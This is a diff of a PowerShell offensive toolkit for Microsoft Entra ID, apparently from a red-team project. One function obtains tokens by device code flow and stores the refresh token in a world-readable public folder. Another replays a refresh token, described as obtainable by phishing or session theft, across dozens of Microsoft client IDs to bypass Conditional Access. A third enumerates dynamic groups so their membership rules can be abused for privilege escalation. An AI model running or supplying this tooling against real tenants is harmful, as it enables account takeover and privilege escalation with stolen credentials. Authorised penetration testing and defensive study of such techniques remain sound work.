@@ -1,48 +1,85 @@
 <#
-	Entra Colection => EntraCollection.ps1
- 
-        Author: Shaked Wiessman (ShkudW), offensive cyber security at Ab-inBev.com
-        This PowerShell Scripts Collection build for Penetration Testing on Entra ID Cloud!
-        I Hope this will help you in your operation
+.SYNOPSIS
+    Entra ID Collection Tools for Offensive Security Operations
+
+.DESCRIPTION
+    This PowerShell collection is designed to support Red Team and penetration testing activities within Microsoft Entra ID (formerly Azure AD) environments.
+    The scripts automate enumeration and data extraction tasks to assist with reconnaissance, privilege escalation mapping, and post-exploitation activities.
+
+
+     Whether you're assessing user visibility, group exposure, role assignments, or token validity — this toolkit aims to streamline offensive operations in the cloud.
+
+.NOTES
+    Author: Shaked Wiessman (@ShkudW)
+    Use responsibly and only in environments you are authorized to test.
+
 #>
 
-function Get-Tokens {	
-<#	
-Getting Access Token and Refreshtoken for Graph API or ARM API.
-The Refresh Token will save in C:\Users\Public\Refreshtoken.txt -> modify it, if you want :)
-Get-Tokens -DomainName domain.local -Graph | -ARM
-#>	
+function Invoke-GetTokens {
+	
+	<#
+    .SYNOPSIS
+        Retrieve Access Token and Refresh Token for Microsoft Graph or Azure Resource Manager (ARM) API.
+
+    .DESCRIPTION
+        This function initiates authentication against the specified Entra ID (Azure AD) tenant using Device Code Flow. 
+        It allows the operator to obtain an access token and a refresh token for either Microsoft Graph or the ARM API, based on the selected switch.
+
+        By default, the refresh token is saved to: C:\Users\Public\Refreshtoken.txt
+        This behavior can be modified by editing the script, if desired.
+
+    .PARAMETER DomainName
+        The Entra ID tenant domain to authenticate against (e.g., ShkudW.com).
+
+    .PARAMETER Graph
+        Use this switch to request a token for the Microsoft Graph API.
+
+    .PARAMETER ARM
+        Use this switch to request a token for the Azure Resource Manager API.
+
+    .EXAMPLE
+        Invoke-GetToken -DomainName ShkudW.com -Graph
+        Invoke-GetToken -DomainName ShkudW.com -ARM
+
+        Prompts for device code authentication and retrieves a Graph API access token and refresh token.
+	#>	
+
 	param(
         [Parameter(Mandatory = $false)] [string]$DomainName,
         [Parameter(Mandatory = $false)] [switch]$Graph,
         [Parameter(Mandatory = $false)] [switch]$ARM		
 	)
-		
-		
-		if ($DomainName -and -not $Graph -and -not $ARM){
-			Write-Host "[!] Please choose between Graph Token or ARM Token" -ForegroundColor DarkBlue
-			Write-Host "    Usage: Get-Tokens -DomainName domain.com -Graph | -ARM" -ForegroundColor DarkBlue
-			return
-		}
 
-		if (-not $DomainName -and -not $Graph -and -not $ARM){
-			Write-Host "[!] Please provide -DomainName and select -Graph or -ARM" -ForegroundColor DarkBlue
-			Write-Host "    Usage: Get-Tokens -DomainName domain.com -Graph | -ARM" -ForegroundColor DarkBlue
-			return
+		function Help {
+			Write-Host "Invoke-GetTokens" -ForegroundColor DarkBlue
+			Write-Host "    Usage: Invoke-GetTokens -DomainName ShkudW.com -Graph'" -ForegroundColor DarkBlue
+            Write-Host "         : Invoke-GetTokens -DomainName ShkudW.com -ARM'" -ForegroundColor DarkBlue
 		}
 				
-		if ($Graph -and $ARM) {
-			Write-Host "[!] Please select only one API: either -Graph or -ARM, not both." -ForegroundColor DarkBlue
-			return
-		}
+            if (-not $DomainName -and -not $Graph -and -not $ARM){
+                Help
+                return
+            }
+
+            if ($DomainName -and -not $Graph -and -not $ARM){
+                Write-Host "[!] Please choose between Graph Token or ARM Token" -ForegroundColor DarkYellow
+                Help
+                return
+            }
+                    
+            if ($Graph -and $ARM) {
+                Write-Host "[!] You can select only one API: either -Graph or -ARM, not both." -ForegroundColor DarkYellow
+                Help
+                return
+            }
 
 
 		function Get-DomainName {
 			try {
 				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
 				$TenantID = ($response.issuer -split "/")[3]
-				Write-Host "[*] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
-                Write-Host "[+] Using this Tenant ID for actions" -ForegroundColor DarkYellow
+				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
+                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
 				return $TenantID
 			} catch {
 				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
@@ -64,8 +101,8 @@ Get-Tokens -DomainName domain.local -Graph | -ARM
 		$authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Headers $headers -Body $Body
 		$code = $authResponse.user_code
 		$deviceCode = $authResponse.device_code
-		Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkCyan -NoNewline
-		Write-Host " $code" -ForegroundColor DarkYellow
+		Write-Host "`n[#] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
+		Write-Host " $code" -ForegroundColor DarkGray
 		Start-Sleep -Seconds 5
 		Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"
 
@@ -82,10 +119,10 @@ Get-Tokens -DomainName domain.local -Graph | -ARM
 				$tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Headers $headers -Body $tokenBody -ErrorAction Stop -ContentType "application/x-www-form-urlencoded"
 				$RefreshToken = $tokenResponse.refresh_token
 				Set-Content -Path "C:\Users\Public\Refreshtoken.txt" -Value $RefreshToken
-				Write-Host "`n[+] Refresh Token saved to C:\Users\Public\Refreshtoken.txt" -ForegroundColor DarkYellow
+				Write-Host "[>] Refresh Token saved to C:\Users\Public\Refreshtoken.txt" -ForegroundColor DarkGray
                 Write-Host " " 
-                if($Graph) {Write-Host "[>] Requesting Access Token For Microsoft Graph API with Refresh Token" -ForegroundColor DarkCyan}
-                if($ARM)   {Write-Host "[>] Requesting Access Token For Azure Resource Management API with Refresh Token" -ForegroundColor DarkCyan}
+                if($Graph) {Write-Host "[>] Requesting Access Token For Microsoft Graph API with Refresh Token" -ForegroundColor DarkYellow}
+                if($ARM)   {Write-Host "[>] Requesting Access Token For Azure Resource Management API with Refresh Token" -ForegroundColor DarkYellow}
                 Write-Host " " 
 				$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token?api-version=1.0"
 
@@ -112,9 +149,9 @@ Get-Tokens -DomainName domain.local -Graph | -ARM
 					$AccessToken = $refreshResponse.access_token
                     if($Graph) {Write-Host "[+] Access Token for Microsoft Graph API retrieved:" -ForegroundColor DarkGreen}
                     if($ARM) {Write-Host "[+] Access Token for Azure Resource Management API retrieved:" -ForegroundColor DarkGreen}
-                    return Write-Host "$AccessToken" -ForegroundColor DarkYellow
+                    return Write-Host "$AccessToken" -ForegroundColor DarkGreen
 					} catch {
-						    Write-Host "`n[-] Failed to retrieve Access Token using Refresh Token." -ForegroundColor Red
+						    Write-Host "`n[-] Failed to retrieve Access Token using Refresh Token." -ForegroundColor DarkRed
 							return $null
 						}
 					} catch {
@@ -122,10 +159,10 @@ Get-Tokens -DomainName domain.local -Graph | -ARM
 						    if ($errorResponse.error -eq "authorization_pending") {
 							    Start-Sleep -Seconds 5
 						    } elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
-							    Write-Host "`n[-] Authorization failed or expired." -ForegroundColor Red
+							    Write-Host "`n[-] Authorization failed or expired." -ForegroundColor DarkRed
 							return
 						    } else {
-							    Write-Host "`n[-] Unexpected error: $($errorResponse.error)" -ForegroundColor Red
+							    Write-Host "`n[-] Unexpected error: $($errorResponse.error)" -ForegroundColor DarkRed
 							return
 						}
 					}
@@ -133,87 +170,118 @@ Get-Tokens -DomainName domain.local -Graph | -ARM
 
 }
 
-
+<###############################################################################################################################################>
 <###############################################################################################################################################>
 
 
-function Check-MFABypass {
+function Invoke-CheckCABypass {
 	
-		<#
-		
-		Trying to getting Access Token for ARM API with defferent client ids.
-		Check-MFABypass -DomainName domain.local -RefreshToken 
-		
-		#>	
+    <#
+    .SYNOPSIS
+        Check if Conditional Access policies can be bypassed using alternate Client IDs on the ARM API.
+
+    .DESCRIPTION
+        This function attempts to access the Azure Resource Manager (ARM) API using the provided refresh token and a set of known Microsoft first-party Client IDs.
+        The goal is to determine whether Conditional Access (CA) enforcement is tied to specific applications, and whether it can be bypassed by reusing the token with a different (trusted) client identity.
+
+        This method is useful in Red Team assessments where access to a refresh token was obtained, and you want to test lateral use of the token across other clients.
+
+    .PARAMETER DomainName
+        The domain name of the target Entra ID tenant (e.g., ShkudW.com).
+
+    .PARAMETER RefreshToken
+        A valid refresh token acquired through prior authentication (e.g., via phishing, session stealing, etc.).
+
+    .EXAMPLE
+        Invoke-CheckCABypass -DomainName ShkudW.com -RefreshToken <your_token>
+
+        Tries multiple client IDs with the refresh token to test if any bypass Conditional Access for ARM API access.
+    #>
+
 	
     param (
-        [Parameter(Mandatory = $true)]
-		[string]$DomainName,
-        [Parameter(Mandatory = $true)]
-		[string]$RefreshToken
+        [Parameter(Mandatory = $true)] [string]$DomainName,
+        [Parameter(Mandatory = $true)] [string]$RefreshToken
     )
 
-    $ClientIDs = @{
-        "00b41c95-dab0-4487-9791-b9d2c32c80f2" = "Office 365 Management"
-        "04b07795-8ddb-461a-bbee-02f9e1bf7b46" = "Microsoft Azure CLI"
-        "0ec893e0-5785-4de6-99da-4ed124e5296c" = "Office UWP PWA"
-        "18fbca16-2224-45f6-85b0-f7bf2b39b3f3" = "Microsoft Docs"
-        "1950a258-227b-4e31-a9cf-717495945fc2" = "Microsoft Azure PowerShell"
-        "1b3c667f-cde3-4090-b60b-3d2abd0117f0" = "Windows Spotlight"
-        "1b730954-1685-4b74-9bfd-dac224a7b894" = "Azure Active Directory PowerShell"
-        "1fec8e78-bce4-4aaf-ab1b-5451cc387264" = "Microsoft Teams"
-        "22098786-6e16-43cc-a27d-191a01a1e3b5" = "Microsoft To-Do client"
-        "268761a2-03f3-40df-8a8b-c3db24145b6b" = "Universal Store Native Client"
-        "26a7ee05-5602-4d76-a7ba-eae8b7b67941" = "Windows Search"
-        "27922004-5251-4030-b22d-91ecd9a37ea4" = "Outlook Mobile"
-        "29d9ed98-a469-4536-ade2-f981bc1d605e" = "Microsoft Authentication Broker"
-        "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8" = "Microsoft Bing Search for Microsoft Edge"
-        "4813382a-8fa7-425e-ab75-3b753aab3abb" = "Microsoft Authenticator App"
-        "4e291c71-d680-4d0e-9640-0a3358e31177" = "PowerApps"
-        "57336123-6e14-4acc-8dcf-287b6088aa28" = "Microsoft Whiteboard Client"
-        "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0" = "Microsoft Flow Mobile PROD-GCCH-CN"
-        "60c8bde5-3167-4f92-8fdb-059f6176dc0f" = "Enterprise Roaming and Backup"
-        "66375f6b-983f-4c2c-9701-d680650f588f" = "Microsoft Planner"
-        "844cca35-0656-46ce-b636-13f48b0eecbd" = "Microsoft Stream Mobile Native"
-        "872cd9fa-d31f-45e0-9eab-6e460a02d1f1" = "Visual Studio - Legacy"
-        "87749df4-7ccf-48f8-aa87-704bad0e0e16" = "Microsoft Teams - Device Admin Agent"
-        "90f610bf-206d-4950-b61d-37fa6fd1b224" = "Aadrm Admin PowerShell"
-        "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223" = "Microsfot Intune Company Portal"
-        "9bc3ab49-b65d-410a-85ad-de819febfddc" = "Microsoft SharePoint Online Management Shell"
-        "a0c73c16-a7e3-4564-9a95-2bdf47383716" = "Microsoft Exchange Online Remote PowerShell"
-        "a40d7d7d-59aa-447e-a655-679a4107e548" = "Accounts Control UI"
-        "a569458c-7f2b-45cb-bab9-b7dee514d112" = "Yammer iPhone"
-        "ab9b8c07-8f02-4f72-87fa-80105867a763" = "OneDrive Sync Engine"
-        "af124e86-4e96-495a-b70a-90f90ab96707" = "OneDrive iOS App"
-        "b26aadf8-566f-4478-926f-589f601d9c74" = "OneDrive"
-        "b90d5b8f-5503-4153-b545-b31cecfaece2" = "AADJ CSP"
-        "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12" = "Microsoft Power BI"
-        "c58637bb-e2e1-4312-8a00-04b5ffcd3403" = "SharePoint Online Client Extensibility"
-        "cb1056e2-e479-49de-ae31-7812af012ed8" = "Microsoft Azure Active Directory Connect"
-        "cf36b471-5b44-428c-9ce7-313bf84528de" = "Microsoft Bing Search"
-        "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" = "SharePoint"
-        "d3590ed6-52b3-4102-aeff-aad2292ab01c" = "Microsoft Office"
-        "e9b154d0-7658-433b-bb25-6b8e0a8a7c59" = "Outlook Lite"
-        "e9c51622-460d-4d3d-952d-966a5b1da34c" = "Microsoft Edge"
-        "eb539595-3fe1-474e-9c1d-feb3625d1be5" = "Microsoft Tunnel"
-        "ecd6b820-32c2-49b6-98a6-444530e5a77a" = "Microsoft Edge"
-        "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d" = "SharePoint Android"
-        "f448d7e5-e313-4f90-a3eb-5dbb3277e4b3" = "Media Recording for Dynamics 365 Sales"
-        "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34" = "Microsoft Edge"
-        "fb78d390-0c51-40cd-8e17-fdbfab77341b" = "Microsoft Exchange REST API Based PowerShell"
-        "fc0f3af4-6835-4174-b806-f7db311fd2f3" = "Microsoft Intune Windows Agent"
-    }
+        $ClientIDs = @{
+            "00b41c95-dab0-4487-9791-b9d2c32c80f2" = "Office 365 Management"
+            "04b07795-8ddb-461a-bbee-02f9e1bf7b46" = "Microsoft Azure CLI"
+            "0ec893e0-5785-4de6-99da-4ed124e5296c" = "Office UWP PWA"
+            "18fbca16-2224-45f6-85b0-f7bf2b39b3f3" = "Microsoft Docs"
+            "1950a258-227b-4e31-a9cf-717495945fc2" = "Microsoft Azure PowerShell"
+            "1b3c667f-cde3-4090-b60b-3d2abd0117f0" = "Windows Spotlight"
+            "1b730954-1685-4b74-9bfd-dac224a7b894" = "Azure Active Directory PowerShell"
+            "1fec8e78-bce4-4aaf-ab1b-5451cc387264" = "Microsoft Teams"
+            "22098786-6e16-43cc-a27d-191a01a1e3b5" = "Microsoft To-Do client"
+            "268761a2-03f3-40df-8a8b-c3db24145b6b" = "Universal Store Native Client"
+            "26a7ee05-5602-4d76-a7ba-eae8b7b67941" = "Windows Search"
+            "27922004-5251-4030-b22d-91ecd9a37ea4" = "Outlook Mobile"
+            "29d9ed98-a469-4536-ade2-f981bc1d605e" = "Microsoft Authentication Broker"
+            "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8" = "Microsoft Bing Search for Microsoft Edge"
+            "4813382a-8fa7-425e-ab75-3b753aab3abb" = "Microsoft Authenticator App"
+            "4e291c71-d680-4d0e-9640-0a3358e31177" = "PowerApps"
+            "57336123-6e14-4acc-8dcf-287b6088aa28" = "Microsoft Whiteboard Client"
+            "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0" = "Microsoft Flow Mobile PROD-GCCH-CN"
+            "60c8bde5-3167-4f92-8fdb-059f6176dc0f" = "Enterprise Roaming and Backup"
+            "66375f6b-983f-4c2c-9701-d680650f588f" = "Microsoft Planner"
+            "844cca35-0656-46ce-b636-13f48b0eecbd" = "Microsoft Stream Mobile Native"
+            "872cd9fa-d31f-45e0-9eab-6e460a02d1f1" = "Visual Studio - Legacy"
+            "87749df4-7ccf-48f8-aa87-704bad0e0e16" = "Microsoft Teams - Device Admin Agent"
+            "90f610bf-206d-4950-b61d-37fa6fd1b224" = "Aadrm Admin PowerShell"
+            "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223" = "Microsfot Intune Company Portal"
+            "9bc3ab49-b65d-410a-85ad-de819febfddc" = "Microsoft SharePoint Online Management Shell"
+            "a0c73c16-a7e3-4564-9a95-2bdf47383716" = "Microsoft Exchange Online Remote PowerShell"
+            "a40d7d7d-59aa-447e-a655-679a4107e548" = "Accounts Control UI"
+            "a569458c-7f2b-45cb-bab9-b7dee514d112" = "Yammer iPhone"
+            "ab9b8c07-8f02-4f72-87fa-80105867a763" = "OneDrive Sync Engine"
+            "af124e86-4e96-495a-b70a-90f90ab96707" = "OneDrive iOS App"
+            "b26aadf8-566f-4478-926f-589f601d9c74" = "OneDrive"
+            "b90d5b8f-5503-4153-b545-b31cecfaece2" = "AADJ CSP"
+            "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12" = "Microsoft Power BI"
+            "c58637bb-e2e1-4312-8a00-04b5ffcd3403" = "SharePoint Online Client Extensibility"
+            "cb1056e2-e479-49de-ae31-7812af012ed8" = "Microsoft Azure Active Directory Connect"
+            "cf36b471-5b44-428c-9ce7-313bf84528de" = "Microsoft Bing Search"
+            "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" = "SharePoint"
+            "d3590ed6-52b3-4102-aeff-aad2292ab01c" = "Microsoft Office"
+            "e9b154d0-7658-433b-bb25-6b8e0a8a7c59" = "Outlook Lite"
+            "e9c51622-460d-4d3d-952d-966a5b1da34c" = "Microsoft Edge"
+            "eb539595-3fe1-474e-9c1d-feb3625d1be5" = "Microsoft Tunnel"
+            "ecd6b820-32c2-49b6-98a6-444530e5a77a" = "Microsoft Edge"
+            "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d" = "SharePoint Android"
+            "f448d7e5-e313-4f90-a3eb-5dbb3277e4b3" = "Media Recording for Dynamics 365 Sales"
+            "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34" = "Microsoft Edge"
+            "fb78d390-0c51-40cd-8e17-fdbfab77341b" = "Microsoft Exchange REST API Based PowerShell"
+            "fc0f3af4-6835-4174-b806-f7db311fd2f3" = "Microsoft Intune Windows Agent"
+        }
+
+		function Help {
+			Write-Host "Invoke-CheckCABypass" -ForegroundColor DarkBlue
+			Write-Host "    Usage: Invoke-CheckCABypass -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......'" -ForegroundColor DarkBlue
+		}
+
+            if (-not $DomainName -and -not $RefreshToken){
+                Help
+                return
+            }
+
+            if ($DomainName -and -not $RefreshToken){
+                Write-Host "[!] You need to provide a Refresh Token" -ForegroundColor DarkYellow
+                Help
+                return
+            }
 		
 		function Get-DomainName {
 			try {
 				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
 				$TenantID = ($response.issuer -split "/")[3]
-				Write-Host "[>] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
+				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
+                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
 				return $TenantID
 			} catch {
-				    Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
-					return $null
-				}
+				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
+				return $null
+			}
 		}
 
         if($DomainName)	{$TenantID = Get-DomainName}
@@ -228,24 +296,24 @@ function Check-MFABypass {
                     "refresh_token" = $RefreshToken
                 }
 
-            try {
-                $response = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
-                $AccessToken = $response.access_token
-                if ($AccessToken) {
-                    Write-Host "[SUCCESS] Access Token for ARM API with Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkGreen
-                    Write-Host "Access Token: $AccessToken" -ForegroundColor DarkYellow
-                } else {
-                    Write-Host "[-] No access token received for Client ID: $ClientID" -ForegroundColor DarkYellow
-                }
+                try {
+                    $response = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
+                    $AccessToken = $response.access_token
+                    if ($AccessToken) {
+                        Write-Host "[^.^] Access Token for ARM API with Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkGreen
+                        Write-Host "Access Token: $AccessToken" -ForegroundColor DarkGreen
+                    } else {
+                        Write-Host "[-] No access token received for Client ID: $ClientID" -ForegroundColor DarkRed
+                    }
 
-             } catch {
-                $errorMessage = $_.ErrorDetails.Message | ConvertFrom-Json
-                if ($errorMessage.error_description -match "AADSTS53003") {
-                    Write-Host "[!] Blocked by Conditional Access - Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkRed
-                }
-                elseif ($errorMessage.error_description -match "AADSTS70000") {
+                } catch {
+                    $errorMessage = $_.ErrorDetails.Message | ConvertFrom-Json
+                    if ($errorMessage.error_description -match "AADSTS53003") {
+                        Write-Host "[!#!] Probably Blocked by Conditional Access - Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkCyan
+                    }
+                    elseif ($errorMessage.error_description -match "AADSTS70000") {
                     Write-Host "[!] Invalid or Malformed Grant - Refresh token likely not valid for Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkGray
-                    Write-Host "[>] Device Code Flow with Client ID: $ClientID for trying to bypass continental access" -ForegroundColor DarkCyan
+                    Write-Host "[>] Device Code Flow with Client ID: $ClientID for trying to bypass continental access" -ForegroundColor DarkYellow
                     $deviceCodeUrl = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/devicecode"
                     $deviceBody = @{
                     client_id = $ClientID
@@ -255,71 +323,94 @@ function Check-MFABypass {
 
                     try {
                         $deviceResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Body $deviceBody
-                        Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkCyan -NoNewline
-                        Write-Host " $($deviceResponse.user_code)" -ForegroundColor DarkYellow
+                        Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
+                        Write-Host " $($deviceResponse.user_code)" -ForegroundColor DarkGray
                         Start-Process $deviceResponse.verification_uri
 
                         $userInput = Read-Host "[...] Press Enter to continue polling, or type 'skip' to skip this client"
                         if ($userInput -eq "skip") {
-                            Write-Host "[>] Skipping Client ID: $ClientID" -ForegroundColor Gray
+                            Write-Host "[>] Skipping Client ID: $ClientID" -ForegroundColor DarkCyan
                         continue
                         }
 
-                    $pollBody = @{
-                        grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
-                        client_id   = $ClientID
-                        device_code = $deviceResponse.device_code
-                    }
+                        $pollBody = @{
+                            grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
+                            client_id   = $ClientID
+                            device_code = $deviceResponse.device_code
+                        }
 
-                    while ($true) {
-                        try {
-                            $pollResponse = Invoke-RestMethod -Method POST -Uri $url -Body $pollBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
-                           $AccessToken = $pollResponse.access_token
-                            Write-Host "[SUCCESS] New Access Token granted with Client ID: $ClientID" -ForegroundColor DarkGreen
-                            Write-Host "Access Token: $AccessToken" -ForegroundColor DarkYellow
-                            break
-                        } catch {
-                            $inner = $_.ErrorDetails.Message | ConvertFrom-Json
-                            if ($inner.error -eq "authorization_pending") {
-                                Start-Sleep -Seconds 5
-                            } elseif ($inner.error -eq "authorization_declined" -or $inner.error -eq "expired_token") {
-                                Write-Host "[-] Authorization failed or expired for Client ID: $ClientID" -ForegroundColor Red
+                        while ($true) {
+                            try {
+                                $pollResponse = Invoke-RestMethod -Method POST -Uri $url -Body $pollBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
+                                $AccessToken = $pollResponse.access_token
+                                Write-Host "[^.^] New Access Token granted with Client ID: $ClientID" -ForegroundColor DarkGreen
+                                Write-Host "Access Token: $AccessToken" -ForegroundColor DarkGreen
                                 break
-                            } else {
-                                Write-Host "[-] Polling error: $($inner.error_description)" -ForegroundColor Red
-                                break
+                            } catch {
+                                $inner = $_.ErrorDetails.Message | ConvertFrom-Json
+                                if ($inner.error -eq "authorization_pending") {
+                                    Start-Sleep -Seconds 5
+                                } elseif ($inner.error -eq "authorization_declined" -or $inner.error -eq "expired_token") {
+                                    Write-Host "[-] Authorization failed or expired for Client ID: $ClientID" -ForegroundColor DarkRed
+                                    break
+                                } else {
+                                    Write-Host "[-] Polling error: $($inner.error_description)" -ForegroundColor DarkRed
+                                    break
+                                }
                             }
                         }
+
+                    } catch {
+                        Write-Host "[-] Device Code flow failed for Client ID: $ClientID - $($_.Exception.Message)" -ForegroundColor DarkRed
                     }
 
-                } catch {
-                    Write-Host "[-] Device Code flow failed for Client ID: $ClientID - $($_.Exception.Message)" -ForegroundColor Red
-                }
-
-            } else {
-                Write-Host "[-] Unhandled error for Client ID: $ClientID - $($errorMessage.error_description)" -ForegroundColor Red
-            }
+                    } else {
+                    Write-Host "[-] Unhandled error for Client ID: $ClientID - $($errorMessage.error_description)" -ForegroundColor DarkRed
+                    }
+                }   
+            Start-Sleep -Milliseconds 500
         }
-
-        Start-Sleep -Milliseconds 500
-    }
 }
 
 
 <###############################################################################################################################################>
-
+<###############################################################################################################################################>
 
 function Invoke-FindDynamicGroups {
 		
-		<#
-		
-		Trying to getting Access Token for ARM API with defferent client ids.
-		Invoke-FindDynamicGroups -DomainName shakudw.local -RefreshToken 
-		Invoke-FindDynamicGroups -DomainName shakudw.local -DeviceCodeFlow 
-		Invoke-FindDynamicGroups -DomainName shakudw.local -ClientId -ClientSecret
-		
-		#>
-	
+    <#
+    .SYNOPSIS
+        Identify dynamic groups in the target Entra ID tenant and analyze their membership rules.
+
+    .DESCRIPTION
+        This function enumerates all dynamic groups within the specified Entra ID tenant and inspects their membership rules 
+        to determine if they rely on attributes such as `mail`, `displayName`, or `userPrincipalName`.
+
+        These attributes can potentially be manipulated during external user invitations (e.g., B2B scenarios) to trigger automatic inclusion 
+        into privileged or sensitive dynamic groups. This technique is commonly used in Entra ID Red Team operations to achieve privilege escalation or persistence.
+
+    .PARAMETER DomainName
+        The domain name of the target tenant (e.g., ShkudW.com).
+
+    .PARAMETER RefreshToken
+        A valid refresh token to authenticate the request.
+
+    .PARAMETER DeviceCodeFlow
+        Use this switch to authenticate via device code flow (interactive).
+
+    .PARAMETER ClientId
+        Client ID for service principal authentication.
+
+    .PARAMETER ClientSecret
+        Client secret corresponding to the provided Client ID.
+
+    .EXAMPLE
+        Invoke-FindDynamicGroups -DomainName contoso.com -RefreshToken <your_token>
+        Invoke-FindDynamicGroups -DomainName contoso.com -DeviceCodeFlow
+        Invoke-FindDynamicGroups -DomainName contoso.com -ClientId <App-id> -ClientSecret <App-secret>
+
+    #>
+
 	
 	param (
         [Parameter(Mandatory = $false)] [string]$RefreshToken,
@@ -329,23 +420,43 @@ function Invoke-FindDynamicGroups {
 		[Parameter(Mandatory = $false)] [string]$ClientSecret
     )
 
-		function Example {
-			Write-Host "Invoke-FindDynamicGroups:" -ForegroundColor DarkYellow
-			Write-Host " Invoke-FindDynamicGroups -DeviceCodeFlow -DomainName <domain.local>" -ForegroundColor DarkCyan
-			Write-Host " Invoke-FindDynamicGroups -RefreshToken <Refresh_Token> -DomainName <domain.local>" -ForegroundColor DarkCyan
-			Write-Host " Invoke-FindDynamicGroups -ClientId <Application_ClientID> -ClientSecret <Application_SecretID> -DomainName <domain.local>" -ForegroundColor DarkCyan
+
+		function Help {
+			Write-Host "Invoke-FindDynamicGroups" -ForegroundColor DarkBlue
+			Write-Host "    Usage: Invoke-FindDynamicGroups -DomainName ShkudW.com -DeviceCodeFlow " -ForegroundColor DarkBlue
+            Write-Host "         : Invoke-FindDynamicGroups -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......'" -ForegroundColor DarkBlue
+            Write-Host "         : Invoke-FindDynamicGroups -DomainName ShkudW.com -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....'" -ForegroundColor DarkBlue
 		}
 
-		if (-not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow -and -not $DomainName ) {
-			Example
-			return
-		}
+            if (-not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow -and -not $DomainName) {
+                Help
+                return
+            }
+
+            if ($DomainName -and -not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow) {
+                Write-Host "[!] You need to provide a Refresh Token or ClientID + ClientSecret or using Device Code Flow" -ForegroundColor DarkYellow
+                Help
+                return
+            }
+
+             if ($DomainName -and $ClientId -and -not $ClientSecret) {
+                Write-Host "[!] You need to provide Clientid and Client Secret" -ForegroundColor DarkYellow
+                Help
+                return
+            }   
+
+            if ($DomainName -and $ClientId -and $ClientSecret -and $RefreshToken -and $DeviceCodeFlow) {
+                Write-Host "[!] What?!?" -ForegroundColor DarkYellow
+                Help
+                return
+            }           
 	
 		function Get-DomainName {
 			try {
 				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
 				$TenantID = ($response.issuer -split "/")[3]
-				Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
+				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
+                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
 				return $TenantID
 			} catch {
 				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
@@ -367,8 +478,8 @@ function Invoke-FindDynamicGroups {
 			$authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Headers $headers -Body $body
 			$code = $authResponse.user_code
 			$deviceCode = $authResponse.device_code
-		    Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkCyan -NoNewline
-			Write-Host " $code" -ForegroundColor DarkYellow
+		    Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
+			Write-Host " $code" -ForegroundColor DarkGray
 			Start-Sleep -Seconds 5
